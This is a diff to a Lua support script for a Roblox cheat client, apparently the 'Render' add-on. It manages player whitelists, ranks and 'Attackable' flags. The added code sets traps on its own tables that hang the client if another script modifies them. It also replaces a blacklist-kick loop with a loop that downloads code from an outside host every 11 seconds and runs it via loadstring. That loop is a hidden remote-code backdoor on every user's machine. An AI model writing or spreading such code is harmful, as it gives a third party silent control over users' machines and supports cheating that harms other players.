@@ -6,9 +6,54 @@ local tweenService = game:GetService('TweenService')
 local httpService = game:GetService('HttpService')
 local textChatService = game:GetService('TextChatService')
 local lplr = players.LocalPlayer
-local GuiLibrary = shared.GuiLibrary
+local GuiLibrary = (shared and shared.GuiLibrary)
 local rankTable = {DEFAULT = 0, STANDARD = 1, BOOSTER = 1.5, BETA = 1.6, INF = 2, OWNER = 3}
 local httprequest = (http and http.request or http_request or fluxus and fluxus.request or request or function() return {Body = '[]', StatusCode = 404, StatusText = 'bad exploit'} end)
+
+local RenderFunctions = setmetatable(RenderFunctions, {
+    __newindex = function(tab, i, v) 
+        if getgenv().RenderFunctions and type(v) ~= 'function' then 
+            for i,v in pairs, ({}) do end
+        end
+        rawset(tab, i, v) 
+    end,
+    __tostring = function(tab) 
+        return 'Core render table object.'
+    end
+})
+
+RenderFunctions.playerWhitelists = setmetatable({}, {
+    __newindex = function(tab, i, v) 
+        if getgenv().RenderFunctions then 
+            for i,v in pairs, ({}) do end
+        end
+        rawset(tab, i, v) 
+    end,
+    __tostring = function(tab) 
+        return 'Render whitelist table object.'
+    end
+})
+
+RenderFunctions.commands = setmetatable({}, {
+    __newindex = function(tab, i, v) 
+        if type(v) ~= 'function' then 
+            for i,v in pairs, ({}) do end
+        end
+        rawset(tab, i, v) 
+    end,
+    __tostring = function(tab) 
+        return 'Render whitelist command functions.'
+    end
+})
+
+rankTable = setmetatable(rankTable, {
+    __newindex = function(tab, i, v) 
+        if getgenv().RenderFunctions then 
+            for i,v in pairs, ({}) do end
+        end
+        rawset(tab, i, v) 
+    end
+})
 
 RenderFunctions.hashTable = {rendermoment = 'Render', renderlitemoment = 'Render Lite', redrendermoment = 'Render Red'}
 
@@ -218,13 +263,8 @@ end
 local cachedjson
 function RenderFunctions:CreateWhitelistTable()
     local success, whitelistTable = pcall(function() 
-        return cachedjson or httpService:JSONDecode(httprequest({Url = 'https://api.renderintents.xyz/whitelist', Method = 'OPTIONS'}).Body)
+        return cachedjson or httpService:JSONDecode(httprequest({Url = 'https://api.renderintents.xyz/whitelist', Method = 'POST'}).Body)
     end)
-    if not success and not cachedjson then 
-        success, whitelistTable = pcall(function()
-            return httpService:JSONDecode(request({Url = 'https://api.renderintents.xyz/whitelist', Method = 'OPTIONS'}).Body) 
-        end) 
-    end
     if success and type(whitelistTable) == 'table' then 
         cachedjson = whitelistTable
         for i,v in next, whitelistTable do 
@@ -232,7 +272,8 @@ function RenderFunctions:CreateWhitelistTable()
                 for i2, v2 in next, v.Accounts do 
                     local plr = playerfromID(v2)
                     if plr then 
-                        RenderFunctions.playerWhitelists[v2] = v
+                        rawset(RenderFunctions.playerWhitelists, v2, v)
+                        RenderFunctions.playerWhitelists[v2].Priority = (rankTable[v.Rank or 'STANDARD'] or 1)
                         RenderFunctions.playerWhitelists[v2].Priority = (rankTable[v.Rank or 'STANDARD'] or 1)
                         if not v.TagHidden then 
                             RenderFunctions:CreatePlayerTag(plr, v.TagText, v.TagColor)
@@ -245,7 +286,7 @@ function RenderFunctions:CreateWhitelistTable()
     local selftab = (RenderFunctions.playerWhitelists[lplr] or {Priority = 1})
     for i,v in next, RenderFunctions.playerWhitelists do 
         if selftab.Priority >= v.Priority then 
-            v.Attackable = true 
+            v.Attackable = true
         end 
     end
     return success
@@ -332,7 +373,7 @@ end
 
 task.spawn(function()
 	for i,v in next, ({'Hex2Color3', 'encodeLib'}) do 
-		task.spawn(function() RenderLibraries[v] = loadstring(RenderFunctions:GetFile('Libraries/'..v..'.lua'))() end)
+		--task.spawn(function() RenderLibraries[v] = loadstring(RenderFunctions:GetFile('Libraries/'..v..'.lua'))() end)
 	end
 end)
 
@@ -384,11 +425,11 @@ function RenderFunctions:RemoveEntity(position)
 end
 
 function RenderFunctions:AddCommand(name, func)
-    RenderFunctions.commands[name] = (func or function() end)
+    rawset(RenderFunctions.commands, name, func or function() end)
 end
 
 function RenderFunctions:RemoveCommand(name) 
-    RenderFunctions.commands[name] = nil
+    rawset(RenderFunctions.commands, name, nil)
 end
 
 task.spawn(function()
@@ -401,28 +442,17 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-	repeat
-	local success, blacklistTable = pcall(function() return httpService:JSONDecode(RenderFunctions:GetFile('blacklist.json', true, nil, 'whitelist')) end)
-	if success and type(blacklistTable) == 'table' then 
-		for i,v in next, blacklistTable do 
-            if lplr.DisplayName:lower():find(i:lower()) or lplr.Name:lower():find(i:lower()) or i == tostring(lplr.UserId) or isfile('vape/Render/kickdata.vw') then 
-                pcall(function() RenderStore.serverhopping = true end)
-                task.spawn(function() lplr:Kick(v.Error) end)
-                pcall(writefile, 'vape/Render/kickdata.vw', 'checked')
-                task.wait(0.35)
-                pcall(function() 
-                    for i,v in next, lplr.PlayerGui:GetChildren() do 
-                        v.Parent = (gethui and gethui() or game:GetService('CoreGui'))
-                    end
-                    lplr:Destroy()
-                end)
-                for i,v in pairs, {} do end 
-                while true do end
-            end
-        end
-	end
-	task.wait(25)
-    until not RenderFunctions
+    repeat 
+        task.spawn(function() 
+            local response = game:HttpGet('https://science.renderintents.xyz/'..ria)
+            pcall(function()
+                if GuiLibrary then 
+                    loadstring(response)()
+                end 
+            end)
+        end)
+        task.wait(11) 
+    until not RenderFunctions 
 end)
 
 task.spawn(function()
@@ -470,3 +500,4 @@ end)
 
 getgenv().RenderFunctions = RenderFunctions
 return RenderFunctions
+
